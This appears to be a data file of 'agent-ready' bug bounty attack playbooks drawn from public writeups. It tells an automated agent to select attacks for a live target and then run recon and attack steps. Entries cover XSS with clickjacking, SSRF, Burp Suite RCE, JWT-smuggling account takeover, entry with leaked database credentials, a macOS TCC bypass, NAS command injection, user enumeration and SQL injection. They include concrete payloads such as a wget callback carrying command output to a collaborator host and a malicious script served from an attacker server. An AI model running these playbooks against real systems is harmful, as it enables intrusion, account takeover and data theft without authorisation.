description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: DOM XSS with Clickjacking

trigger_conditions.when_to_apply: When a user can create or edit a post with a CTA link and the server does not sanitize the URL for JavaScript URIs.
prerequisites: Attacker can create or edit a Threadit post.
The target application does not properly sanitize URLs provided for Call-to-Action (CTA) links.
applicability_signals: The `cta.url` field is present in the PATCH /draft/{draftId} request.
The application allows setting a custom URL for CTA links.
skip_if: The application validates and rejects `javascript:` URIs.
The server adds `X-Frame-Options: DENY` header to prevent clickjacking.

recon_steps: Step 1: Create a Threadit post with a CTA link. Intercept the PATCH /draft/{draftId} request.
Step 2: Observe the structure of the request, specifically the `cta.url` field.
attack_steps: Step 1: Intercept the PATCH /draft/{draftId} request made when setting a CTA link for a post.
Step 2: Modify the `url` field within the `cta` object to `javascript:alert(document.domain)`.
Step 3: Publish the post.
Step 4: Craft an HTML page containing an iframe that embeds the published Threadit post. Use CSS to make the iframe invisible and position it over a decoy button or link.
Step 5: Instruct the victim to click on the decoy element on the attacker's page. If using a Chromium-based browser, instruct them to hold CTRL while clicking.
Step 6: Observe if the `alert(document.domain)` executes.
payloads_or_patterns:
PATCH /draft/<draftId> 
 Host: api.threadit.app 
 Content-Type: application/json 
 
 { "cta": [ { "text":"Click me", "url":"javascript:alert(document.domain)" } ], "isCtaPresent":true }
tools_recommended: Burp Suite (or similar proxy): To intercept and modify HTTP requests.
HTML/JavaScript: To craft the clickjacking page.
success_indicators: An alert box displaying `threadit.app` or the relevant domain appears after the user clicks the crafted link.
The `javascript:` URI is executed in the browser context of the embedded iframe.
failure_indicators: The `javascript:` URI is not executed, and a blank or error page loads (especially in Chromium browsers without modifier keys). → Suggest trying modifier keys (CTRL) or exploiting clickjacking.
The server rejects the `javascript:` URI during the PATCH request. → Suggest trying other potentially dangerous URI schemes or looking for different injection points.

playbooks.impact: Allows an attacker to execute arbitrary JavaScript code in the context of the victim's browser session on Threadit, potentially leading to session hijacking, phishing, or other malicious actions through clickjacking.
playbooks.key_lesson: Always sanitize user-provided URLs, especially those intended for navigation, to prevent `javascript:` URI execution. Implement `X-Frame-Options: DENY` or `SAMEORIGIN` to mitigate clickjacking risks.

meta.title: SSRF in PDF export with PhantomJs

tech_stack_fingerprints: Evidence of PhantomJS usage (e.g., server-side logs, specific error messages related to PhantomJS)

trigger_conditions.when_to_apply: When a web application uses PhantomJS to generate PDFs from user-provided URLs or content, and the input is not properly validated.
prerequisites: Attacker must have an authenticated session on the target application.
The application must have a feature that generates PDFs based on user input.
applicability_signals: The PDF generation feature takes a URL or content that can be controlled by the user.
Server-side logs indicate PhantomJS is used for PDF generation.
skip_if: The application explicitly sanitizes or validates all input URLs used for PDF generation.
The PDF generation functionality is client-side only.

recon_steps: Step 1: Identify functionalities that allow users to export content or generate documents (e.g., PDF export).
Step 2: Analyze the input parameters for these functionalities to determine if URLs or HTML content can be provided by the user.
attack_steps: Step 1: Craft a malicious URL that points to an internal resource or a controlled external server. For example: `http://localhost:8080/admin` or `http://<attacker-controlled-server>/exploit.html`.
Step 2: Submit this crafted URL as input to the PDF export functionality.

Step 3: Observe the response for evidence of the SSRF. This could be the PDF content reflecting the data from the internal resource, or a callback to the attacker-controlled server if the internal resource interacts with the attacker's server.
payloads_or_patterns: URL pointing to internal services: `http://localhost:8080/admin`
URL pointing to sensitive endpoints: `http://192.168.1.1/settings.php`
URL pointing to attacker's server for exfiltration: `http://<attacker-burp-collaborator-domain>/`
Payload for direct HTML injection via PhantomJS: `` (if HTML content is allowed)
tools_recommended: Burp Suite Collaborator (for detecting outbound connections from SSRF)
Netcat (to listen for incoming connections on specific ports)
Custom scripts to automate URL parameter fuzzing
success_indicators: The generated PDF contains data from internal network resources.
A callback is received at the attacker-controlled server (e.g., Burp Collaborator) when the PDF generation process requests the malicious URL.
Error messages in the response or server logs indicate access to unintended resources.
failure_indicators: The application returns an error indicating an invalid URL format without making an external request.
The PDF generation fails, and no callback is observed.
A 403 Forbidden or similar error is received when trying to access internal resources, indicating a WAF or firewall blocking.

playbooks.impact: An attacker can access internal network resources, sensitive configuration files, or even execute commands on the server if the PDF generation process has sufficient privileges. This can lead to data breaches, unauthorized access, and system compromise.
playbooks.key_lesson: Sanitize and validate all user-supplied URLs used in server-side PDF generation, especially when using potentially dangerous rendering engines like PhantomJS, to prevent SSRF vulnerabilities.

meta.title: 反制爬虫之Burp Suite RCE

affected_components: Built-in Chromium renderer (Proxy -> HTTP history -> Response -> Render, Repeater -> Render)

trigger_conditions.when_to_apply: When Burp Suite Pro is used and its internal Chromium browser version is outdated and vulnerable, particularly when JavaScript analysis is enabled.
prerequisites: Attacker has network access to the target Burp Suite instance.
Target Burp Suite version is vulnerable to specific Chromium v8 engine exploits.
applicability_signals: Burp Suite Pro v2.0beta or similar versions are in use.
The internal Chromium version (e.g., 64.0.3282.24) is identified.
Live audit from Proxy with JavaScript analysis is enabled.
MITMEngine or similar TLS fingerprinting detection is bypassed or not in place.
skip_if: Target Burp Suite is running the latest Chromium version.
WAF or other security controls effectively block the exploit traffic based on TLS fingerprinting (JA3).

recon_steps: Step 1: Analyze Burp Suite Pro installation to identify the bundled Chromium version. This can be done by examining extracted JAR files and directory structures (e.g., `browsercore-64.0.3282.24.unknown`).
Step 2: Cross-reference the identified Chromium version against known CVEs and exploit databases to determine its vulnerability status.
attack_steps: Step 1: Configure Burp Suite's 'Live audit from Proxy' to enable 'JavaScript analysis' and 'dynamic analysis techniques', and ensure 'Make requests for missing Javascript dependencies' is enabled.
Step 2: Craft a malicious JavaScript payload that exploits a known v8 engine vulnerability (e.g., the Math.expm1 vulnerability mentioned in the writeup) to execute shellcode.
Step 3: Host the malicious JavaScript payload on a controlled server.

Step 4: Trigger the Burp Suite's Live Audit. When Burp Suite analyzes a page with JavaScript dependencies, it will make an extra request for the dependency. If the attacker controls the dependency, they can serve the malicious JavaScript.
Step 5: The internal Chromium browser in Burp Suite will render the page and execute the malicious JavaScript, triggering the v8 exploit and executing shellcode on the host machine.
payloads_or_patterns: Malicious JavaScript payload designed to exploit a specific Chromium v8 engine vulnerability (e.g., OOB write in Math.expm1). Example concept: `<script src='http://<ATTACKER_CONTROLLED_SERVER>/malicious.js'></script>` within a webpage that Burp Suite is configured to audit.
The `malicious.js` file would contain the exploit code.
tools_recommended: Burp Suite Pro: for configuring and triggering the Live Audit.
A web server (e.g., Nginx, Python SimpleHTTPServer): to host the malicious JavaScript payload.
Exploit development environment (e.g., Python, Metasploit): to craft the shellcode and confirm RCE.
Network analysis tools (e.g., Wireshark): to monitor traffic and confirm requests for the malicious script.
success_indicators: Execution of shellcode on the Burp Suite host machine, observable via a reverse shell or by creating a file on the victim's system.
The Chromium process associated with Burp Suite exhibiting unexpected behavior or crashing.
The attacker receiving a callback from the executed shellcode.
failure_indicators: No shellcode execution, no reverse shell callback, and no observable system changes. This could indicate the Chromium version is patched, the exploit is ineffective, or the sandbox is still partially functional. Pivot: Attempt to exploit other vulnerabilities in Burp Suite or its dependencies.
WAF or TLS fingerprinting (JA3) blocking the malicious JavaScript requests. Pivot: Attempt to use different TLS cipher suites or obfuscation techniques, or find a way to bypass the fingerprinting.

playbooks.impact: Remote Code Execution on the host machine running Burp Suite Pro. This allows an attacker to gain full control over the victim's system, steal sensitive data handled by Burp Suite (e.g., session tokens, credentials), and pivot to other systems within the network.
playbooks.key_lesson: Always check for vulnerable bundled components like outdated Chromium instances within desktop applications, especially when sandbox protections are disabled or bypassed. Leverage features like automated JavaScript analysis for '0-click' exploitation opportunities.

meta.title: Eye for an eye: Unusual single click JWT token takeover

trigger_conditions.when_to_apply: When the target application exhibits an open redirect vulnerability that can be manipulated to pass custom parameters, especially in authentication flows involving JWTs.
prerequisites: Target application uses JWT for authentication.
Target application has an open redirect vulnerability in an authentication-related endpoint.
applicability_signals: The presence of a `/jwt-auth/datalore` endpoint.
The `auth_url` parameter in requests to `/jwt-auth/datalore` can be controlled by the attacker.
The `auth_url` parameter allows redirection to arbitrary jetbrains.com subdomains.
The `auth_url` parameter can include query parameters.
skip_if: The `auth_url` parameter is strictly validated against a whitelist of allowed domains and paths.
The JWT tokens are not passed as URL parameters after redirection.
WAF blocks crafted URLs with multiple query parameters or URL encoding.

recon_steps: Step 1: Identify authentication-related endpoints, particularly those handling tokens or redirects.
Step 2: Test for open redirect vulnerabilities by providing various external URLs in redirect parameters.
Step 3: Analyze the redirection mechanism for controllable subdomains within the target domain (e.g., `*.jetbrains.com`).
Step 4: Investigate if custom parameters, including JWTs, can be smuggled within the redirect URL or other parameters.
attack_steps: Step 1: Craft a malicious URL targeting the `/jwt-auth/datalore` endpoint on `account.jetbrains.com`.
Step 2: Set the `auth_url` parameter to a valid Datalore authentication URL (`https://datalore.jetbrains.com/jetbrains_auth`).
Step 3: Smuggle the attacker's JWT token as a query parameter within the `auth_url` parameter: `?jwt={attacker's_jwt}`.

Step 4: Smuggle the victim's desired redirect URL (e.g., a domain controlled by the attacker like `https://0d.tf`) as a `return_to` parameter within the `auth_url` parameter, ensuring it's URL encoded: `%26%72%65%74%75%72%6e%5f%74%6f%3d<URL_ENCODED_ATTACKER_HOST>`.
Step 5: Ensure the main `return_to` parameter of the initial request points to a Datalore URL to facilitate the chain of redirects.

Step 6: Deliver the crafted malicious URL to the victim. Upon clicking, the victim will be redirected through a chain that ultimately includes the attacker's JWT and then the victim's JWT, leading to session hijacking.
payloads_or_patterns: https://account.jetbrains.com/jwt-auth/datalore?auth_url=https://datalore.jetbrains.com/jetbrains_auth?jwt=<ATTACKER_JWT>%26return_to=https%3A%2F%2F<ATTACKER_CONTROLLED_HOST>&return_to=https://datalore.jetbrains.com/
tools_recommended: Burp Suite: For intercepting and modifying requests, crafting URL-encoded payloads.
A simple web server: To host the attacker-controlled redirect page (e.g., `0d.tf`).
success_indicators: The victim is redirected to the attacker-controlled host (`https://0d.tf` in the example) with the victim's JWT embedded in the URL parameters.
The attacker can then potentially capture the victim's JWT from the URL or subsequent requests made by the victim's browser.
The attacker can use the captured victim JWT to authenticate as the victim on Datalore.
failure_indicators: The target endpoint does not exist or returns an error (e.g., 404). -> Investigate other endpoints for similar vulnerabilities.
The `auth_url` parameter is not processed or parameters within it are ignored.
The `return_to` parameter is strictly validated and does not allow attacker-controlled hosts.
The redirection chain breaks or does not include both JWTs in the final redirect.
The JWT tokens are not passed as URL parameters in the final redirect.
A WAF blocks the request due to suspicious URL encoding or parameter combination. -> Try different encoding methods or alternative bypasses.

playbooks.impact: Account takeover of the victim's JetBrains Datalore account. This could lead to unauthorized access to sensitive data, code, or intellectual property stored within Datalore, as well as potential for further exploitation or reputational damage.
playbooks.key_lesson: Always scrutinize open redirect vulnerabilities, especially in authentication flows. Pay close attention to how parameters are processed and how they can be used to smuggle other sensitive data like JWTs, potentially leading to account takeover.

meta.title: More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers

trigger_conditions.when_to_apply: When Facebook Canvas applications are served within the Comet framework and the target application fails to properly validate Cross-Window-Message origins.
prerequisites: Attacker must have a Facebook account.
Target Canvas app must be integrated with Facebook and served via Comet.
applicability_signals: Observing Cross-Window-Message communication between a Canvas app and the parent Facebook window.
The Canvas app does not perform strict origin validation on messages received via `postMessage`.
skip_if: The Canvas app strictly validates the origin of all `postMessage` calls, rejecting messages from any domain other than the expected origin.

recon_steps: Step 1: Identify Facebook Canvas applications that are integrated and loaded within the Comet framework. This may involve inspecting network requests and iframe content when interacting with Facebook features.
Step 2: Observe the JavaScript execution within the Canvas app and the parent Facebook page. Look for instances of `window.postMessage` being used for inter-window communication.
attack_steps: Step 1: Craft a malicious webpage that mimics the expected origin of the Facebook Canvas app. This malicious page will host the attacker's JavaScript code.
Step 2: Send a `postMessage` from the malicious webpage to the vulnerable Facebook Canvas app, containing a crafted payload designed to exploit the origin validation weakness.
Step 3: The vulnerable Canvas app, upon receiving the malicious message, will process it without proper origin validation, leading to the execution of attacker-controlled actions or data leakage.
Step 4: The attacker's JavaScript on the malicious page can then capture sensitive information (like session tokens or user IDs) or perform actions on behalf of the user.
payloads_or_patterns: JavaScript code to send `window.postMessage('<attacker_controlled_data>', '<expected_canvas_origin>')` from a malicious page.
Exploiting the lack of validation on incoming `postMessage` events within the Canvas app to exfiltrate data or execute commands.
tools_recommended: Burp Suite: To intercept and analyze network traffic, identify Canvas apps, and observe `postMessage` communication.
Browser Developer Tools: For JavaScript debugging, inspecting `postMessage` calls, and manipulating origins.
success_indicators: Attacker-controlled JavaScript executing within the context of the Facebook Canvas app or parent window.
Exfiltration of sensitive user data (e.g., session tokens, user identifiers) to the attacker's server.
Unauthorized actions performed on behalf of the user within the Canvas app or Facebook.
failure_indicators: The Canvas app's JavaScript logs indicate that `postMessage` calls from unexpected origins are being ignored or rejected.
No sensitive data is exfiltrated, and no unauthorized actions are performed, suggesting robust origin validation is in place. Pivot to other vulnerabilities if this occurs.

playbooks.impact: Account takeover of Facebook users by allowing malicious websites to interact with Facebook Canvas applications, leading to the theft of session tokens or the execution of unauthorized actions on the user's behalf.
playbooks.key_lesson: Always implement strict origin validation for all `postMessage` calls to prevent Cross-Window Message exploitation.

meta.title: How @Mailru traeted my report on their program

trigger_conditions.when_to_apply: When a subdomain within the corp.mail.ru domain returns a 500 Internal Server Error, indicating debug mode might be enabled and sensitive information may be exposed.
prerequisites: Discovery of a *.corp.mail.ru subdomain
The subdomain must return a 500 Internal Server Error.
applicability_signals: Response code 500 for *.corp.mail.ru subdomains
Debug mode enabled in server responses (e.g., revealing S3 bucket names or database credentials)
skip_if: All *.corp.mail.ru subdomains respond with non-500 status codes and do not reveal sensitive information.

recon_steps: Step 1: Enumerate subdomains for *.corp.mail.ru.
Step 2: Send requests to identified subdomains and monitor for 500 Internal Server Errors.
Step 3: Analyze the response body of 500 errors for exposed sensitive information like AWS_STORAGE_BUCKET_NAME or database credentials.
Step 4: If database credentials are found, inspect loaded JavaScript files for clues to the database host IP address or hostname. Look for patterns like 'api.legium.io' or similar.
attack_steps: Step 1: Upon finding a subdomain like legium-back.corp.mail.ru returning 500 and exposing `AWS_STORAGE_BUCKET_NAME = ‘legium-media’`, note the bucket name.
Step 2: If database credentials (e.g., username, password, DB name) are also exposed, parse them.
Step 3: Scrape all JS files from the affected subdomain (e.g., https://legium-back.corp.mail.ru/static/api.js) to find potential database hostnames or IP addresses.
Step 4: Experiment with variations of found hostnames (e.g., removing numbers like 'api2' to get 'api') to find a working database endpoint.
Step 5: Perform a port scan on the identified database hostname (e.g., api.legium.io) for common database ports like 5432 (PostgreSQL).
Step 6: If port 5432 is open, attempt to connect to the database using the previously found credentials and a PostgreSQL client (e.g., psql).
payloads_or_patterns: S3 bucket name pattern: `AWS_STORAGE_BUCKET_NAME = ‘<bucket_name>’`
Database hostname pattern in JS: `api<number>.legium.io`
PostgreSQL port: 5432
tools_recommended: Subdomain enumeration tools (e.g., subfinder, amass)
HTTP client (e.g., curl, Burp Suite) for sending requests and analyzing responses
JavaScript deobfuscator/parser
Port scanner (e.g., nmap)
PostgreSQL client (e.g., psql)
success_indicators: Successful connection to the PostgreSQL database using discovered credentials and hostname.
Ability to query tables (e.g., 'case_case') and retrieve data, confirming access to sensitive information.
failure_indicators: Subdomains do not return 500 errors or do not expose sensitive configurations.
No database credentials found in exposed debug information.
No usable database hostnames found in JS files.
Port scanning reveals the database port (5432) is closed.
Connection to the database fails with authentication errors or other connection issues.

playbooks.impact: Disclosure of sensitive AWS S3 bucket names and database credentials, leading to unauthorized access to a PostgreSQL database containing 325 MB of data, including agreements and potentially personally identifiable information of famous individuals.
playbooks.key_lesson: When encountering 500 Internal Server Errors on subdomains, always inspect responses for debug information that may reveal credentials for cloud storage (like S3) or databases, and examine linked JavaScript files for clues to internal network infrastructure.

meta.title: Play the music and bypass TCC aka CVE-2020-29621

trigger_conditions.when_to_apply: When an attacker has the ability to place a custom dynamic library or plugin into a specific system path that is loaded by a privileged daemon with `com.apple.security.cs.disable-library-validation` entitlement.
prerequisites: Attacker has arbitrary file write access to `/Library/Audio/Plug-Ins/HAL/`
Target system is macOS
applicability_signals: Core audio daemon (`coreaudiod`) process has the `com.apple.security.cs.disable-library-validation` entitlement.
Core audio daemon loads plug-ins from `/Library/Audio/Plug-Ins/HAL/`.
skip_if: Target system is not macOS.
The `coreaudiod` daemon does not have the `com.apple.security.cs.disable-library-validation` entitlement.
The `/Library/Audio/Plug-Ins/HAL/` directory is not writable by the attacker.

recon_steps: Step 1: Identify processes on macOS with the `com.apple.security.cs.disable-library-validation` entitlement. (e.g., using `codesign -d --entitlements :- /path/to/binary` or Hopper to reverse engineer binaries).
Step 2: Analyze identified processes to determine if they load external libraries or plug-ins from predictable locations. For `coreaudiod`, identify the loading path `/Library/Audio/Plug-Ins/HAL/`.
attack_steps: Step 1: Craft a malicious HAL plug-in that includes code to interact with Apple's private TCC framework.
Step 2: Write the malicious plug-in to the `/Library/Audio/Plug-Ins/HAL/` directory on the target macOS system.
Step 3: Restart the `coreaudiod` daemon or trigger its reload mechanism to load the malicious plug-in.

Step 4: Execute the code within the malicious plug-in to call `TCCAccessSetForBundleIdAndCodeRequirement` with the desired entitlements (e.g., `kTCCServiceSystemPolicyAllFiles`) for a target application (e.g., `com.apple.Terminal`).
tools_recommended: Hopper Disassembler: To reverse engineer `coreaudiod` and identify loading paths and entitlements.
Xcode: To compile the malicious HAL plug-in.
SSH or local shell access: To write the plug-in to the target file system.
success_indicators: The target application (e.g., Terminal.app) gains the granted permission (e.g., Full Disk Access) without user interaction.
Observing that the target application can now access resources it was previously denied.
Confirmation in TCC database entries if accessible, although direct TCC database modification is avoided by using private APIs.
failure_indicators: The malicious plug-in is not loaded by `coreaudiod`. (Check daemon logs or process introspection).
The `TCCAccessSetForBundleIdAndCodeRequirement` function call fails or has no effect. (Check return values if available, or observe application behavior).
The entitlement `com.apple.security.cs.disable-library-validation` is not present on `coreaudiod`. (Indicates a different target or OS version).

playbooks.impact: An attacker can gain privileged access to protected data and resources on the macOS system by granting applications permissions (e.g., Full Disk Access, microphone, camera access) without user consent or system prompts. This leads to a full bypass of macOS privacy mechanisms.
playbooks.key_lesson: When a privileged process has the `disable-library-validation` entitlement and loads plugins from a user-writable directory, investigate the possibility of injecting malicious code into that process's context to inherit its privileges.

meta.title: Your Vulnerability Is In Another OEM!
meta.authors: Lucas Georges, Julien Boutet, Thomas Chauchefoin

target_profile.technology: Western Digital My Cloud Pro PR4100

trigger_conditions.when_to_apply: This technique is applicable when the target device exposes CGI scripts via its web server, and these scripts do not adequately sanitize or validate user-supplied input before executing system commands or interacting with sensitive functionality. Particularly, if CGI scripts accept a 'cmd' parameter or similar for 'system_mgr', 'account_mgr', 'p2p_upload', or 'apkg_mgr' without proper permission checks.
prerequisites: The target device must be accessible via its web interface on ports 80 or 443.
applicability_signals: Discovery of a '/cgi-bin/' directory in the firmware.
Apache rewrite rules redirecting to a cgi_api.php script.
The presence of 'system_mgr', 'account_mgr', 'p2p_upload', or 'apkg_mgr' as cgi_name parameters in the cgi_api.php script.
The existence of a 'cmd' parameter within the query data for these cgi scripts.
skip_if: All requests to CGI scripts result in a 406 'Not Acceptable' response, indicating strict function permission checks are in place for all commands.
The web server is not running or is inaccessible.

recon_steps: Step 1: Unpack the firmware using 'binwalk -Mer' to identify CGI scripts and configuration files.
Step 2: Analyze web server configuration files (e.g., '/web/apache2/conf/mods-enabled/rewrite.conf') to understand how CGI requests are handled.
Step 3: Examine the cgi_api.php script to identify the switch cases and the parameters accepted by each CGI handler (e.g., 'system_mgr', 'account_mgr').
Step 4: Identify CGI handlers that appear to accept a command parameter (e.g., 'cmd').
Step 5: Note the specific CGI handlers and their associated commands that might be vulnerable to command injection.
attack_steps: Step 1: Craft a request to the target URL targeting a vulnerable CGI handler (e.g., system_mgr) with a malicious command injected into the 'cmd' parameter. Example: Send POST request to <TARGET_URL>/web/cgi_api.php?cgi_name=system_mgr with body 'cmd=<PAYLOAD>'
Step 2: Observe the response for signs of command execution. This may involve looking for specific output from the command or system behavior changes.
Step 3: If direct command output is not visible, try to infer execution by attempting to create a file, ping an external server (e.g., Burp Collaborator), or perform other observable actions.
Step 4: If the initial payload is unsuccessful, try different command injection techniques and encoding methods.
payloads_or_patterns: '; touch /tmp/pwned; #
'; wget http://<COLLABORATOR_DOMAIN>/$(id) -O /dev/null; #
'; nslookup <PAYLOAD_HOST>; #
| id > /tmp/id.txt
$(id)
`id`
tools_recommended: Burp Suite: To intercept, modify, and send HTTP requests. Use Intruder to brute-force commands.
curl: For crafting and sending HTTP requests from the command line.
binwalk: To unpack firmware images.
success_indicators: The creation of a file on the target system (e.g., '/tmp/pwned').
A callback received on an external server (e.g., Burp Collaborator) from a ping or DNS lookup command.
Specific output from commands like 'id' appearing in the response or by creating a file containing the output.
failure_indicators: Consistent 406 'Not Acceptable' responses for all command attempts, indicating strict input validation or permission checks.
No observable changes on the target system or callbacks to external services.
The command injection payload is simply reflected in the response without execution.
Suggest trying enumeration of different CGI handlers or command parameters if initial attempts fail. Consider fuzzing for other parameters that might be vulnerable.

playbooks.impact: Remote Code Execution on the Western Digital NAS device, allowing an attacker to gain full control of the device, access sensitive data stored on the NAS, modify system configurations, or use the device as a pivot point for further network compromise.
playbooks.key_lesson: When analyzing embedded systems with CGI interfaces, thoroughly investigate how user-supplied parameters, especially those intended for command execution, are handled by the backend scripts. Pay close attention to functions like 'check_function_permission' and ensure they are robust against manipulation.

meta.title: GitLab User Information Disclosure Via Open API

tech_stack_fingerprints: Subdomain found using subdomain enumeration (e.g. gitlab.bkwi.nl)

trigger_conditions.when_to_apply: When a GitLab instance is found and its API endpoint for user information is accessible without authentication.
prerequisites: A running GitLab instance within the target's infrastructure.
applicability_signals: Access to the GitLab API endpoint like /api/v4/users/<user_id> returns a 200 OK response.
User IDs appear to be sequential integers.
skip_if: GitLab API requires authentication for user information retrieval.
User IDs are not sequential or easily guessable.

recon_steps: Step 1: Identify subdomains of target domains using subdomain enumeration tools (e.g., Amass, Sublist3r).
Step 2: Analyze identified subdomains for technologies like GitLab by checking HTTP responses and common GitLab patterns.
attack_steps: Step 1: Once a GitLab instance is found (e.g., gitlab.bkwi.nl), navigate to the user API endpoint: `https://gitlab.bkwi.nl/api/v4/users/<user_id>`.
Step 2: Start with a known or guessed user ID (e.g., 1, 2, 31).
Step 3: Systematically iterate through a range of numeric user IDs (e.g., 1-9999) to discover user information.
Step 4: Record any disclosed user information (e.g., username, name, email, profile picture URL).
payloads_or_patterns: https://<TARGET_URL>/api/v4/users/<USER_ID>
tools_recommended: Burp Suite Intruder: To automate the brute-forcing of user IDs.
Amass: For subdomain enumeration.
curl: For manual testing of API endpoints.
success_indicators: Receiving a 200 OK HTTP status code for the /api/v4/users/<USER_ID> endpoint.
Response body contains JSON data with user details such as 'username', 'name', 'email', 'avatar_url'.
failure_indicators: Receiving 404 Not Found for most user IDs, indicating the range might be incorrect or the API is not vulnerable.
Receiving 401 Unauthorized or 403 Forbidden, indicating authentication is required.

playbooks.impact: Disclosure of user information including usernames, full names, and email addresses, which can be used for further targeted attacks or social engineering.
playbooks.key_lesson: Always test GitLab API endpoints for user information disclosure by enumerating sequential user IDs when authentication is not enforced.

meta.title: CVE-2021-2429: A Heap-based Buffer Overflow Bug In The Mysql Innodb Memcached Plugin

tech_stack_fingerprints: InnoDB memcached plugin enabled (-DWITH_INNODB_MEMCACHED=ON build flag)

trigger_conditions.when_to_apply: When the MySQL InnoDB memcached plugin is enabled and the target is running a vulnerable version of MySQL.
prerequisites: MySQL server must be compiled with -DWITH_INNODB_MEMCACHED=ON.
The InnoDB memcached plugin must be configured and accessible.
applicability_signals: Target is known to be running MySQL 8.0.25 or prior.
Network port 11211 (default memcached) is open and accessible on the MySQL server.
Successful connection to the memcached service on port 11211.
skip_if: Target is running MySQL version 8.0.26 or later.
The InnoDB memcached plugin is not enabled or configured.

recon_steps: Step 1: Fingerprint the target to confirm MySQL version. Use nmap or other network scanning tools to identify MySQL service and version.
Step 2: Check if TCP port 11211 is open and accessible on the target host. This is the default port for memcached.
Step 3: Attempt to connect to the memcached service on port 11211 using a memcached client or netcat. Send a simple command like 'version' to check for a response.
attack_steps: Step 1: Construct a memcached GET command with specially crafted keys that exploit the vulnerability. The key format should be '@@containers.name' where 'name' is a controllable string.
Step 2: Send the crafted GET command to the MySQL server's memcached port (default 11211). Example: 'get @@aaa @@aaa @@aaa ...'

Step 3: Observe the MySQL server's behavior for signs of a heap-based buffer overflow. This may manifest as a crash (SIGSEGV) or other abnormal process termination, potentially leading to code execution.
payloads_or_patterns: get @@aaa @@aaa @@aaa ... (where 'aaa' is a repeated string to control overflow length, e.g., 'get @@test/demo_test @@test/demo_test @@test/demo_test')
tools_recommended: netcat (nc) for sending raw TCP/UDP commands to port 11211.
Custom script (Python/Go) to automate sending crafted GET requests and monitor for server crashes or abnormal behavior.
success_indicators: MySQL server process (mysqld) crashes or terminates unexpectedly.
Receiving a SIGSEGV signal on the server host (if remote execution of commands is possible).
Observation of heap corruption in memory dumps (if available).
failure_indicators: Server returns a standard memcached error response (e.g., 'ERROR'). This indicates the payload may not be triggering the vulnerability or the plugin is not configured as expected. Pivot to checking plugin enablement and configuration.
No response from the server after sending the payload. This could indicate network issues, firewall blocking, or the memcached service not running. Verify network connectivity and service status.

playbooks.impact: Remote code execution on the MySQL database server, allowing an attacker to compromise the entire system.
playbooks.key_lesson: When a heap-based buffer overflow is identified in a release build of software and the vulnerable code path is guarded by an assert() statement, investigate whether the assert condition is reachable in release builds, as it may indicate a security flaw.

meta.title: Now Patched Vulnerability in WhatsApp could have led to data exposure of users

trigger_conditions.when_to_apply: When a user interacts with image filters in WhatsApp, especially when handling potentially malformed image files.
prerequisites: Attacker needs to send a crafted image file to a victim.
Victim needs to open the attachment.
Victim needs to attempt to apply a filter.
Victim needs to send the filtered image back to the attacker (or an intermediary).
applicability_signals: The target application processes user-uploaded images and applies filters.
The application uses image processing libraries that might be susceptible to memory corruption.
skip_if: The application has robust input validation and sanitization for image files.
The application does not allow sharing of images or applying filters.

recon_steps: Step 1: Analyze image handling and filter functionality within the WhatsApp application. Identify the specific image formats processed.
Step 2: Investigate the image filter application logic and data processing steps involved.
attack_steps: Step 1: Craft a malformed GIF image file designed to trigger an Out-Of-Bounds read/write vulnerability during image filter application.
Step 2: Send the crafted GIF file as an attachment to a target WhatsApp user.
Step 3: Instruct the target user to open the attachment and attempt to apply an image filter.
Step 4: Instruct the target user to send the filtered image back to the attacker (or an attacker-controlled intermediary).
payloads_or_patterns: Malformed GIF file generated using fuzzing techniques (e.g., AFL fuzzer).
tools_recommended: AFL++ (American Fuzzy Lop) for generating malformed image files.
ADB (Android Debug Bridge) for debugging and capturing crash logs on a test device.
success_indicators: Observed crash of the WhatsApp application on the victim's device during filter application or sending.
Analysis of crash logs (adb logcat) revealing SIGSEGV (signal 11) and specific fault addresses, indicating memory corruption.
Theoretically, sensitive information read from WhatsApp memory.
failure_indicators: The application does not crash or behave unexpectedly when processing the crafted image and applying filters.
Input validation prevents the malformed file from being processed.
The crash occurs in a way that does not indicate an exploitable memory corruption (e.g., a benign error).

playbooks.impact: An attacker could have potentially read sensitive information from WhatsApp's memory on the victim's device, leading to data exposure.
playbooks.key_lesson: When analyzing applications that process user-provided files, especially media like images, use fuzzing techniques to discover memory corruption vulnerabilities in file parsing and manipulation code, particularly during operations like applying filters.

meta.title: CVE-2021-39165: A Bug Bounty Journey from a Laravel SQL Injection Vulnerability

trigger_conditions.when_to_apply: When the target application is Cachet and an API endpoint is found to be vulnerable to SQL injection via its search functionality.
prerequisites: Target is Cachet CMS
Authenticated or unauthenticated access to the API
applicability_signals: Endpoint uses `Binput::except(...)` for search parameters.
The `scopeSearch` method in `SearchableTrait` is used.
The `array_intersect` check in `scopeSearch` can be bypassed or does not sufficiently sanitize inputs.
skip_if: The `array_intersect` check in `scopeSearch` strictly enforces whitelisted searchable fields and prevents injection.
Input sanitization by `Laravel-Binput` is sufficient.

recon_steps: Step 1: Identify Cachet CMS installations.
Step 2: Enumerate API endpoints, specifically looking for components related to searching or filtering data (e.g., `/api/v1/components`).

Step 3: Inspect the source code (if available) or use dynamic analysis tools to understand how search parameters are handled and passed to the backend, paying attention to the use of `Binput` and custom scope methods.
attack_steps: Step 1: Send a GET request to an identified API endpoint (e.g., `/api/v1/components`).
Step 2: Include parameters that are expected to be used for searching, such as `sort`, `order`, or others that are passed to `Binput::except()` before being processed by `scopeSearch`.
Step 3: Craft a payload for the search parameter that includes SQL injection syntax. For example, trying to use `array_intersect` to pass a malicious key.
Step 4: Analyze the response for signs of SQL execution, such as errors, altered data, or timing differences.
payloads_or_patterns: Example payload for `search` parameter (may need adaptation based on the specific vulnerable parameter and `array_intersect` bypass): `search[invalid_field]=value` or `search[component]=1 OR 1=1` to test for boolean-based blind SQLi.
tools_recommended: Burp Suite: To intercept, modify, and send requests, as well as to analyze responses.
SQLMap: For automated SQL injection detection and exploitation, if a clear injection point is identified.
success_indicators: Error messages in the response indicating a SQL syntax error.
Unexpected data returned in the response, suggesting data leakage.
Delayed responses indicating time-based blind SQL injection.
